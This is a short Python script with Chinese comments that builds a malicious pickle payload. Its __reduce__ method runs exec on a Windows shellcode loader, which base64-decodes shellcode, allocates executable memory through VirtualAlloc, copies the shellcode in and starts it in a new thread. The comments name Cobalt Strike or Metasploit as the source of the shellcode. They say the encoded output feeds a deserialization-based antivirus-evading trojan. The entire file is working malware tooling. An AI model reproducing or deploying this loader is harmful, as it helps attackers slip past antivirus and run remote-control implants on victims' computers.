import pickle,base64


# cd填入的值是由cs或者msf生成的playload.c里shellcode的base64的值
shellcode='''cd=''
cd=base64.b64decode(cd)
ctypes.windll.kernel32.VirtualAlloc.restype=ctypes.c_uint64
shangxian = ctypes.windll.kernel32.VirtualAlloc(0, len(cd), 0x1000, 0x40)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(shangxian), ctypes.create_string_buffer(cd), len(cd))
handle = ctypes.windll.kernel32.CreateThread(0, 0, ctypes.c_uint64(shangxian), 0, 0, 0)
ctypes.windll.kernel32.WaitForSingleObject(handle, -1)'''

class s():
    def __reduce__(self):
        return (exec,(shellcode,))

# 输出的值是填入反序列化免杀木马里的s1_b64的值
s1=pickle.dumps(s())
s1_b64=base64.b64encode(s1)
print(s1_b64)
